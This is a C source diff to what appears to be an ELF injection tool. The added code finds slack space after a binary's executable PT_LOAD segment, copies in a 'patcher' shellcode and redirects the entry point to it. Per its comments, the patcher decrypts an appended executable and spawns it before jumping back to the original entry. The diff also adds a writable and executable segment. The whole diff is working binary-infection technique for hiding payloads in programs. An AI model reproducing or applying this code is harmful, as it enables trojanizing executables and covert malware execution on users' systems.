@@ -11,6 +11,8 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
+#include "shell.h"
+
 #define NUM_CMD_ACTIONS         (4)
 
 #define MAX_NUM_CMD_ARGS        (10)
@@ -217,9 +219,103 @@ static int extend_mapped_file(int fd, size_t *old_size, size_t increment,
 
 static int cb_action_select_target_elf(int argc, char **argv)
 {
-    return open_and_map_file(argv[1], &g_sinject_context.target_fd,
-                             &g_sinject_context.target_size,
-                             &g_sinject_context.target_mem);
+    int ret, i;
+    ssize_t max_payload_size = 0;
+    elf_hdr_t *target_elf_hdr;
+    Elf32_Phdr *re_phdr = NULL;
+    void *payload_start;
+    off_t payload_start_offset, original_e_entry;
+
+    ret = open_and_map_file(argv[1], &g_sinject_context.target_fd,
+                            &g_sinject_context.target_size,
+                            &g_sinject_context.target_mem);
+    if (ret < 0) {
+        printf("ERROR %d something went wrong open_target\n", ret);
+        return ret;
+    }
+
+    target_elf_hdr = g_sinject_context.target_mem;
+    if (memcmp(target_elf_hdr->elf64_hdr.e_ident, elf_signature,
+        sizeof(elf_signature)) != 0) {
+        printf("ERROR target not an ELF file\n");
+        return -1;
+    }
+
+    /* Iterate the segments and verify how much space do we have left in the
+     * PT_LOAD segment with (R & E) permission. If we are lucky because of
+     * the page boundary aligment, we can inject our payload
+     */
+
+    if (target_elf_hdr->elf64_hdr.e_machine == EM_386) {
+        for (i = 0; i < target_elf_hdr->elf32_hdr.e_phnum; i++) {
+            Elf32_Phdr *iter_phdr = (Elf32_Phdr *)
+                (g_sinject_context.target_mem + target_elf_hdr->elf32_hdr.e_phoff) + i;
+
+            if (iter_phdr->p_type == PT_LOAD &&
+                (iter_phdr->p_flags & PF_X) &&
+                (iter_phdr->p_flags & PF_R)) {
+
+                /* Found the PT_LOAD Read + execute segment */
+
+                re_phdr              = iter_phdr;
+                payload_start_offset = re_phdr->p_offset + re_phdr->p_memsz;
+
+                /* Found how much space do we have between the PT_LOAD
+                 * segment and the next segment.
+                 */
+
+                if (i + 1 < target_elf_hdr->elf32_hdr.e_phnum) {
+                    max_payload_size = (re_phdr + 1)->p_offset -
+                        payload_start_offset;
+                }
+            }
+        }
+
+        if (max_payload_size <= 0) {
+            printf("ERROR %ld payload size invalid\n", max_payload_size);
+            return -1;
+        }
+
+        if (re_phdr == NULL) {
+            printf("ERROR no PT_LOAD read+execute segment in target\n");
+            return -1;
+        }
+
+        printf("Max payload size is: %ld\n", max_payload_size);
+        payload_start = g_sinject_context.target_mem + payload_start_offset;
+
+        /* Good, we have the max payload size - we need to copy the patcher
+         * in this area. The patcher is reponsible for decrypting the attached
+         * executable(at the end of the target elf), assigning execute
+         * permissions and spawning a child process which runs it.
+         */
+
+        if (shellcode_32_len > max_payload_size) {
+            printf("Too bad, no space to inject %u bytes of payload\n",
+                   shellcode_32_len);
+            return -1;
+        }
+
+        /* Update the entry point address after copying the patcher but keep
+         * the original entry point in a variable
+         */
+
+        original_e_entry                  = target_elf_hdr->elf32_hdr.e_entry;
+        target_elf_hdr->elf32_hdr.e_entry = payload_start_offset;
+
+        printf("Original entry: 0x%lx new entry: 0x%lx\n", original_e_entry,
+               payload_start_offset);
+
+        /* Update the last instruction of the patcher to redirect the
+         * execution to the original entry point.
+         */
+
+        *((int *)&shellcode_32[40]) = original_e_entry - (40 + payload_start_offset);
+        printf("displacement: %d bytes\n", *(int *)&shellcode_32[40]);
+        memcpy(payload_start, shellcode_32, shellcode_32_len);
+    }
+
+    return 0;    
 }
 
 static int cb_action_select_payload(int argc, char **argv)
@@ -250,12 +346,12 @@ static int cb_action_add_segment(int argc, char **argv)
 
         size_t old_size = g_sinject_context.target_size;
 
-        /* Extend the file size with a new Program headers + one new segment
+        /* Extend the file size with a new Program header + one new segment
          * + 0x1000 bytes which will be used for the payload and map again */
 
         extend_mapped_file(g_sinject_context.target_fd,
                            &g_sinject_context.target_size,
-                           0x1000 + sizeof(Elf32_Phdr) * (target_elf_hdr->elf32_hdr.e_phnum + 1),
+                           0x2000 + sizeof(Elf32_Phdr) * (target_elf_hdr->elf32_hdr.e_phnum + 1),
                            &g_sinject_context.target_mem);
 
         target_elf_hdr = g_sinject_context.target_mem;
@@ -267,8 +363,8 @@ static int cb_action_add_segment(int argc, char **argv)
 
         memcpy(destination, src, sizeof(Elf32_Phdr) * target_elf_hdr->elf32_hdr.e_phnum);
 
-        /* Populate the new segment data */
-
+        /* Compute the address of the next load segment that we want to insert */
+#if 1
         size_t new_segment_offset = 0;
         size_t aligned_address = 0;
 
@@ -284,7 +380,8 @@ static int cb_action_add_segment(int argc, char **argv)
                  }
             }
         }
-   
+#endif
+        printf("Virtual addr of the new segment is :%lx\n", new_segment_offset);
         new_phdr32 = (Elf32_Phdr *)(destination + sizeof(Elf32_Phdr) * target_elf_hdr->elf32_hdr.e_phnum);
         new_phdr32->p_type   = PT_LOAD;
         new_phdr32->p_filesz = 0x1000;
@@ -295,26 +392,28 @@ static int cb_action_add_segment(int argc, char **argv)
         new_phdr32->p_align  = 0x1000;
         new_phdr32->p_flags  = PF_X | PF_R | PF_W;
 
+#if 1
         /* Update the first segment program header */
 
         Elf32_Phdr *phdr_segment = (Elf32_Phdr *)destination;
-        phdr_segment->p_offset += new_phdr32->p_vaddr;
+        phdr_segment->p_offset = old_size;
         phdr_segment->p_memsz  = sizeof(Elf32_Phdr) * (target_elf_hdr->elf32_hdr.e_phnum + 1);
         phdr_segment->p_filesz = phdr_segment->p_memsz;
-        phdr_segment->p_vaddr  += new_phdr32->p_vaddr;
-        phdr_segment->p_paddr  += new_phdr32->p_paddr;
-
+        phdr_segment->p_vaddr  = old_size;//new_phdr32->p_vaddr;
+        phdr_segment->p_paddr  = old_size;//new_phdr32->p_paddr;
+#endif
         /* Update the ELF header with the new program header table and the new
          * program header segment number*/
 
         target_elf_hdr->elf32_hdr.e_phnum++;
         target_elf_hdr->elf32_hdr.e_phoff = old_size;
-
+#if 0
         size_t increment = new_segment_offset + 0x1000 - g_sinject_context.target_size;
         extend_mapped_file(g_sinject_context.target_fd,
                            &g_sinject_context.target_size,
                            increment,
                            &g_sinject_context.target_mem);
+#endif
     } else if (target_elf_hdr->elf64_hdr.e_machine == EM_X86_64) {
         Elf64_Phdr *phdr = (Elf64_Phdr *)(target_elf_hdr->elf64_hdr.e_phoff +
             (uint8_t *)g_sinject_context.target_mem);
